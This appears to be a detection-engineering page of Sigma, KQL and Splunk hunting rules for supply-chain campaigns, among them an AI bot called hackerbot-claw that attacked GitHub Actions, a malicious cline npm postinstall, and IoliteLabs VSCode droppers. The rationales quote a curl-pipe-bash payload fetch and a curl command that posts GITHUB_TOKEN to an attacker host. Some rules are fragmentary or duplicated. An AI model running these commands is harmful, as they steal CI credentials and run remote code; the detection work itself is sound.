title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions - Microsoft, DataDog, and CNCF Projects Hit So Far

StepSecurity
2026-04-09 10 use cases 4 techniques 6 kill-chain phases detected

A week-long automated attack campaign targeted CI/CD pipelines across major open source repositories, achieving remote code execution in at least 4 out of 5 targets. The attacker, an autonomous bot called hackerbot-claw, used 5 different exploitation techniques and successfully exfiltrated a GitHub token with write permissions from one of the most popular repositories on GitHub. This post breaks down each attack, shows the evidence, and explains what you can do to protect your workflows.

[LLM] hackerbot-claw payload host: DNS/HTTP egress to hackmoltrepeat.com (C2 + exfil) Command & Control High
Identifies hosts (CI/CD runners, build agents, developer workstations) that resolve or connect to hackmoltrepeat.com or its recv subdomain - the single network destination shared by every hackerbot-claw exploitation attempt across Microsoft, DataDog, CNCF and other affected repos. The /molt path delivers the second-stage payload; recv.hackmoltrepeat.com receives exfiltrated GITHUB_TOKEN values. Rationale: Domain hackmoltrepeat.com and subdomain recv.hackmoltrepeat.com are pre-extracted IOCs from the article and are the single network destination shared by all 5 exploitation techniques. The /molt URI path is the second-stage payload endpoint named verbatim in the article (Block 2: `curl -sSfL hackmoltrepeat.com/molt | bash`). Any DNS or HTTP resolution to this domain family is virtually pathognomonic of hackerbot-claw activity.

[LLM] hackerbot-claw second-stage download: curl -sSfL pipe-bash from hackmoltrepeat.com/molt Installation High
Detects the exact bash one-liner used as the payload across every hackerbot-claw exploitation attempt: `curl -sSfL hackmoltrepeat.com/molt | bash`. Targets self-hosted GitHub Actions runners, build agents, and developer workstations where the second-stage script executed. Rationale: Command-line string `curl -sSfL hackmoltrepeat.com/molt | bash` is verbatim from the article (Block 2) and is the SAME payload delivered by all 5 attack techniques (Pwn Request, direct script injection, branch-name injection, etc.). The flag combination `-sSfL` (silent, show-errors, fail-on-HTTP-error, follow-redirects) plus the literal `/molt` path is a high-fidelity fingerprint that won't collide with legitimate curl usage.

[LLM] hackerbot-claw token exfiltration: curl POST with GITHUB_TOKEN to recv.hackmoltrepeat.com Actions on Objectives High
Detects the specific token-theft curl invocation used by hackerbot-claw in avelino/awesome-go PR #6069 and other successful compromises: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The combination of GITHUB_TOKEN reference + recv.hackmoltrepeat.com destination is virtually pathognomonic of this campaign. Rationale: The article (Attack 1, avelino/awesome-go) shows the exact exfil payload verbatim: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The conjunction of the literal string GITHUB_TOKEN with the recv.hackmoltrepeat.com hostname in a single process command-line is a near-zero-FP signal because legitimate workflows never POST $GITHUB_TOKEN to externally-controlled domains. Image [5] in the article (PR #6069 malicious init function) is the source of the exact code snippet.
ATT&CKT1552.001 T1567 T1071.001 T1195.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "GITHUB_TOKEN" or ProcessCommandLine has "$GITHUB_TOKEN" or ProcessCommandLine has "GITHUB_REPOSITORY")
   and (ProcessCommandLine has "hackmoltrepeat.com" or ProcessCommandLine has "recv.hackmoltrepeat.com")
| extend HasAuthHeader = ProcessCommandLine has "Authorization: Bearer"
| extend HasTokenPostBody = ProcessCommandLine has "token=" and ProcessCommandLine has "repo="
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, HasAuthHeader, HasTokenPostBody, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(30d)
  | where (TargetProcessCommandLine has "GITHUB_TOKEN" or TargetProcessCommandLine has "GITHUB_REPOSITORY")
     and (TargetProcessCommandLine has "hackmoltrepeat.com" or TargetProcessCommandLine has "recv.hackmoltrepeat.com")
  | extend HasAuthHeader = TargetProcessCommandLine has "Authorization: Bearer"
  | project TimeGenerated, Host=DvcHostname, User=ActorUsername, Image=TargetProcessName, CommandLine=TargetProcessCommandLine, ParentImage=ActingProcessName, ParentCommandLine=ActingProcessCommandLine, HasAuthHeader, SourceTable="ImProcessCreate"),
(SecurityEvent
  | where TimeGenerated > ago(30d)
  | where EventID == 4688
  | where CommandLine has "GITHUB_TOKEN" and CommandLine has "hackmoltrepeat"
  | extend HasAuthHeader = CommandLine has "Authorization: Bearer"
  | project TimeGenerated, Host=Computer, User=SubjectUserName, Image=NewProcessName, CommandLine, ParentImage=ParentProcessName, ParentCommandLine="", HasAuthHeader, SourceTable="SecurityEvent4688"),
(Syslog
  | where TimeGenerated > ago(30d)
  | where SyslogMessage has "GITHUB_TOKEN" and SyslogMessage has "hackmoltrepeat"
  | project TimeGenerated, Host=Computer, User="", Image=ProcessName, CommandLine=SyslogMessage, ParentImage="", ParentCommandLine="", HasAuthHeader=(SyslogMessage has "Authorization: Bearer"), SourceTable="Syslog")
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02

    - attack.t1555.003

    product: windows

    selection_path:

            - '\Microsoft\Edge\User Data\'

    selection_file:
        TargetFilename|endswith:

            - '\Cookies'

Trusted vendor binary / installer launching unusual children Exploitation Medium

ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) · [LLM] OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw'
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) · OAuth consent / suspicious app grant
[LLM] npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) Installation High
Hunts the smoking-gun command emitted by the cline@2.3.0 postinstall hook: 'npm install -g openclaw@latest'. Any device or CI runner where node/npm spawns this exact subcommand received the OpenClaw implant. Optionally surface the parent 'npm install cline' / 'npm i cline' to attribute the chain. Rationale: Anchored on the verbatim postinstall command from the article ('npm install -g openclaw@latest') and the bookend package name 'openclaw'. The npm/node parent narrows scope to dependency-resolution flows so an analyst typing the literal package name in chat won't trigger. cline-parent enrichment attributes the supply-chain pivot.
ATT&CKT1195.002 T1059.007 T1505.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "openclaw"
| where (FileName in~ ("npm","npm.cmd","node","node.exe","npm-cli.js") or InitiatingProcessFileName in~ ("npm","npm.cmd","node","node.exe"))
| where ProcessCommandLine matches regex @"(?i)\b(install|i|add)\b(\s+--global|\s+-g)?\s+openclaw"
   or ProcessCommandLine matches regex @"(?i)\bopenclaw(@(latest|[\d\.]+))?\b"
| extend SupplyChainParent = iff(InitiatingProcessCommandLine has_cs "cline" or InitiatingProcessParentFileName in~ ("npm","node"), "cline@2.3.0 postinstall (suspected)", "")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SupplyChainParent
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName matches regex @"(?i)(^|[\\/])(npm|npm\.cmd|node|node\.exe|npm-cli\.js)$"
   or ActingProcessCommandLine matches regex @"(?i)\bnpm\b"
| where ActingProcessCommandLine matches regex @"(?i)\b(install|^i$|add)\b\s+(--global\s+|-g\s+)?openclaw(@\S+)?"
| extend SupplyChainParent = iff(ParentProcessCommandLine has_cs "cline" or ActingProcessCommandLine has "cline", "cline@2.3.0 postinstall (suspected)", "")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine, SupplyChainParent
| order by TimeGenerated desc

[LLM] OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789 Command & Control High
Hunts the OpenClaw 'Gateway' daemon — a WebSocket server on ws://127.0.0.1:18789 that exposes operator API commands. Surfaces either the listening socket creation OR a process connecting to localhost:18789 (the attack surface where CVE-2026-25253 is exploited via a crafted role:operator handshake). Rationale: Port 18789 + loopback is verbatim from the article ('WebSocket server on ws://127.0.0.1:18789'). The combination is highly specific — random localhost services on this exact port are vanishingly rare, and the implant always exposes this endpoint.
ATT&CKT1071.001 T1219
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where (LocalPort == 18789 and LocalIP in ("127.0.0.1","::1"))
     or (RemotePort == 18789 and RemoteIP in ("127.0.0.1","::1"))
| where ActionType in ("ListeningConnectionCreated","ConnectionSuccess","ConnectionAttempt","InboundConnectionAccepted")
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName, LocalIP, LocalPort, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where (DstPortNumber == 18789 and DstIpAddr in ("127.0.0.1","::1"))
     or (SrcPortNumber == 18789 and SrcIpAddr in ("127.0.0.1","::1"))
| project TimeGenerated, DvcHostname, EventType, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, NetworkProtocol, NetworkApplicationProtocol
| order by TimeGenerated desc

[LLM] Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) Actions on Objectives High
Surfaces reads/writes against the OpenClaw secret-bearing files — ~/.openclaw/credentials/ and ~/.openclaw/config.json5 — which the article identifies as the primary loot target on a victim host. Any file event under these paths confirms the implant is active and/or is being plundered. Rationale: The article enumerates these exact paths as the credential reading targets for the operator API. Path '~/.openclaw/' is unique to this implant — there is no legitimate, widely-deployed tool by that name in the dev-tooling ecosystem outside of this attack's own implant, so any hit warrants investigation regardless of process.
ATT&CKT1552.001 T1555
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where (FolderPath has "/.openclaw/credentials" or FolderPath has "/.openclaw/" and FileName =~ "config.json5")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath matches regex @"(?i)/\.openclaw/(credentials/|config\.json5$)"
| project TimeGenerated, DvcHostname, EventType, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc

[LLM] OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw' Installation High
Catches the daemon-install step the article calls out explicitly: OpenClaw drops a launchd plist (macOS) or systemd unit (Linux) so the Gateway survives reboot. Any file create under /Library/Launch* or /etc/systemd/system, or ~/.config/systemd/user, whose name or content references openclaw is the persistence smoking gun. Rationale: Article explicitly states OpenClaw 'installs a persistent Gateway daemon (via launchd on macOS or systemd on Linux) that remains running in the background'. The persistence path + the openclaw/clawdbot/moltbot brand strings give a clean, single-selection detection with effectively no legitimate FP outside of sanctioned OpenClaw deployments.
ATT&CKT1543.004 T1543.002
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has_any ("/Library/LaunchDaemons","/Library/LaunchAgents","/etc/systemd/system","/etc/systemd/user","/.config/systemd/user")
| where FileName has_any ("openclaw","clawdbot","moltbot") or FolderPath has_any ("openclaw","clawdbot","moltbot")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileCreate")
| where TargetFilePath matches regex @"(?i)(^|/)(Library/Launch(Daemons|Agents)|etc/systemd/(system|user)|\.config/systemd/user)/"
| where TargetFileName matches regex @"(?i)(openclaw|clawdbot|moltbot)" or TargetFilePath matches regex @"(?i)(openclaw|clawdbot|moltbot)"
| project TimeGenerated, DvcHostname, EventType, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc
title: OpenClaw Persistence — launchd Plist / systemd Unit Drop

status: experimental
description: Detects a file create/modify in macOS LaunchDaemons/LaunchAgents or Linux systemd unit directories where the file or path mentions openclaw, clawdbot, or moltbot (former names of the same project, per the article).

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-25253")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-25253")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"

[LLM] IoliteLabs VSCode extension dropper: VS Code child process reaching rraghh.com / oortt.com C2 Delivery High
Detects the obfuscated pako/index.js dropper inside the malicious IoliteLabs Solidity extensions spawning curl/cmd to fetch stage-2 from the attacker's C2 infrastructure. Fires on any child of VS Code, Code Insiders, Cursor, Windsurf, or VSCodium whose command line references rraghh.com, cdn.rraghh.com, or oortt.com — the three exclusive domains used by this campaign. Rationale: Uses the three campaign-exclusive C2 hostnames (rraghh.com, cdn.rraghh.com, oortt.com) confirmed in both the StepSecurity disclosure and the public GitHub issue #4 on iolitelabs/vscode-solidity-iolite. The parent-process narrowing to the VS Code family (incl. Cursor / Windsurf / VSCodium) ensures we hit only dropper executions and not analyst lookups of these strings in browsers/editors. Activation event onStartupFinished means this fires on every IDE launch on a compromised host, so a 30d lookback will catch any historic infection. Cross-checked against: • https://www.stepsecurity.io/blog/malicious-iolitelabs-vscode-extensions-target-solidity-developers-on-windows-macos-and-linux-with-backdoor • https://github.com/iolitelabs/vscode-solidity-iolite/issues/4 • https://marketplace.visualstudio.com/items?itemName=IoliteLabs.solidity-windows • https://marketplace.visualstudio.com/items?itemName=IoliteLabs.solidity-macos
ATT&CKT1195.002 T1059.003 T1105
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("Code.exe","Code - Insiders.exe","Cursor.exe","Windsurf.exe","VSCodium.exe","Positron.exe")
   or InitiatingProcessFolderPath has_any (@"\Microsoft VS Code\", @"\Cursor\", @"\Windsurf\", @"\VSCodium\")
| where ProcessCommandLine has_any ("rraghh.com","oortt.com","cdn.rraghh.com")
   or (ProcessCommandLine has "curl" and ProcessCommandLine has_any (@"%TEMP%\1.bat", @"\Temp\1.bat"))
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has_any ("Code.exe","Code - Insiders.exe","Cursor.exe","Windsurf.exe","VSCodium.exe")
| where TargetProcessCommandLine has_any ("rraghh.com","oortt.com","cdn.rraghh.com")
   or (TargetProcessCommandLine has "curl" and TargetProcessCommandLine has "\\1.bat")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine, SHA256
| order by TimeGenerated desc

[LLM] IoliteLabs Stage-2 regsvr32 LOLbin loading ntuser DLL from fake Chrome\ChromeUpdate path Installation High
Detects the 7WhiteSmoke.msi stage-2 installer's execution of regsvr32 against an extension-less file named 'ntuser' under %APPDATA%\Chrome\ChromeUpdate\ — the persistence + DLL-load technique used by the IoliteLabs backdoor. The combination of regsvr32 LOLbin + ntuser file + fake ChromeUpdate path + DllInstall (-i flag) is extremely article-specific and avoids generic regsvr32 detections. Rationale: The combination is uniquely article-specific: regsvr32 /s /i is one DLL-load LOLbin variant, but the path '\Chrome\ChromeUpdate\ntuser' is a deliberate masquerade chosen by this attacker (per the StepSecurity OLE2/cabinet analysis) — Google's real Chrome updater is GoogleUpdate / msedge_updater, never under that path. We also pin the SHA256 of the dropper DLL (5f9c09c2c432a6b94f2200455065bcfd1237f8a01b913a7c9e37f164ff99a84c) and the MSI installer (e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3) for file-event matching. Cross-checked against: • https://www.stepsecurity.io/blog/malicious-iolitelabs-vscode-extensions-target-solidity-developers-on-windows-macos-and-linux-with-backdoor • https://github.com/iolitelabs/vscode-solidity-iolite/issues/4
ATT&CKT1218.010 T1036.005 T1547.001
Data sourcesEndpoint.Processes Endpoint.Filesystem
let _knownHashes = dynamic(["5f9c09c2c432a6b94f2200455065bcfd1237f8a01b913a7c9e37f164ff99a84c","e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3"]);
let ProcSig = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where FileName =~ "regsvr32.exe"
    | where ProcessCommandLine has "ntuser"
    | where ProcessCommandLine has @"\Chrome\ChromeUpdate"
         or ProcessCommandLine matches regex @"(?i)regsvr32(\.exe)?\s+/s\s+/i\s+.*ntuser"
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, Source="ProcessExec";
let HashSig = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where SHA256 in (_knownHashes)
       or (FileName =~ "ntuser" and FolderPath has @"\Chrome\ChromeUpdate")
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine=tostring(SHA256), Source="FileWrite";
union ProcSig, HashSig
| order by Timestamp desc
let _knownHashes = dynamic(["5f9c09c2c432a6b94f2200455065bcfd1237f8a01b913a7c9e37f164ff99a84c","e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3"]);
let ProcSig = SecurityEvent
    | where TimeGenerated > ago(30d)
    | where EventID == 4688
    | where NewProcessName endswith @"\regsvr32.exe"
    | where CommandLine has "ntuser"
    | where CommandLine has @"\Chrome\ChromeUpdate"
         or CommandLine matches regex @"(?i)regsvr32(\.exe)?\s+/s\s+/i\s+.*ntuser"
    | project TimeGenerated, Computer, Account, CommandLine, ParentProcessName, Source="SecurityEvent4688";
let AsimSig = ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where TargetProcessName endswith @"\regsvr32.exe"
    | where TargetProcessCommandLine has "ntuser" and TargetProcessCommandLine has @"\Chrome\ChromeUpdate"
    | project TimeGenerated, Computer=DvcHostname, Account=ActorUsername, CommandLine=TargetProcessCommandLine, ParentProcessName, Source="ImProcessCreate";
let FileSig = ImFileEvent
    | where TimeGenerated > ago(30d)
    | where TargetFileSHA256 in (_knownHashes)
       or (TargetFileName =~ "ntuser" and TargetFilePath has @"\Chrome\ChromeUpdate")
    | project TimeGenerated, Computer=DvcHostname, Account=ActorUsername, CommandLine=ActingProcessCommandLine, ParentProcessName=ActingProcessName, Source="ImFileEvent";
union ProcSig, AsimSig, FileSig

source:windows.sysmon @EventID:1 @Image:(*\\regsvr32.exe OR *\\REGSVR32.EXE OR *\\Regsvr32.exe) @CommandLine:(*ntuser* OR *NTUSER* OR *NtUser*) @CommandLine:(*\\Chrome\\ChromeUpdate* OR *\\chrome\\chromeupdate* OR *\\CHROME\\CHROMEUPDATE*)
ENDPOINT

| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="regsvr32.exe" AND Processes.process="*ntuser*" AND (Processes.process="*\\Chrome\\ChromeUpdate*" OR Processes.process="* /i *") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process Processes.process_hash | `drop_dm_object_name(Processes)` | where match(process,"(?i)regsvr32.*\\s/(s|i)\\b.*ntuser") OR match(process,"(?i)Chrome\\\\ChromeUpdate\\\\ntuser") | sort - firstTime

[LLM] IoliteLabs IOC sweep: rraghh.com / oortt.com hostnames + campaign file hashes Command & Control High
Broad IOC-driven sweep for any host that resolves, contacts, or writes files associated with the IoliteLabs Solidity backdoor — network connections to rraghh.com / cdn.rraghh.com / oortt.com plus the four pivotal SHA-256 hashes (tampered pako, MSI installer, ntuser DLL). Use this as a retro-hunt on first deployment, and standing rule going forward. Rationale: All four IOCs (three domains + three file hashes) are unique to this campaign per StepSecurity's analysis and corroborated by GitHub issue #4 on the upstream IoliteLabs repository (where the project maintainers acknowledge the malicious v0.1.8 publish was outside their control). Hostnames are checked via DNS-suffix match to also catch CNAME redirections and any future subdomains under rraghh.com / oortt.com. The 7WhiteSmoke.msi filename + Documents folder write path is the second C2 hop (oortt.com) not present in the original dropper. Cross-checked against: • https://www.stepsecurity.io/blog/malicious-iolitelabs-vscode-extensions-target-solidity-developers-on-windows-macos-and-linux-with-backdoor • https://github.com/iolitelabs/vscode-solidity-iolite/issues/4 • https://marketplace.visualstudio.com/items?itemName=IoliteLabs.solidity-windows
ATT&CKT1071.001 T1071.004 T1105
Data sourcesNetwork_Resolution.DNS Web.Web Endpoint.Filesystem
let _iocHashes = dynamic(["fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508","e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3","5f9c09c2c432a6b94f2200455065bcfd1237f8a01b913a7c9e37f164ff99a84c"]);
let _iocDomains = dynamic(["rraghh.com","oortt.com","cdn.rraghh.com"]);
let Net = DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where RemoteUrl has_any (_iocDomains) or tostring(RemoteIP) in (_iocDomains)
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, Indicator=RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine, Source="Network";
let Dns = DeviceEvents
    | where Timestamp > ago(30d)
    | where ActionType == "DnsQueryResponse"
    | extend Q = tostring(parse_json(AdditionalFields).QueryName)
    | where Q endswith "rraghh.com" or Q endswith "oortt.com"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, Indicator=Q, InitiatingProcessFileName, InitiatingProcessCommandLine, Source="DNS";
let Files = DeviceFileEvents
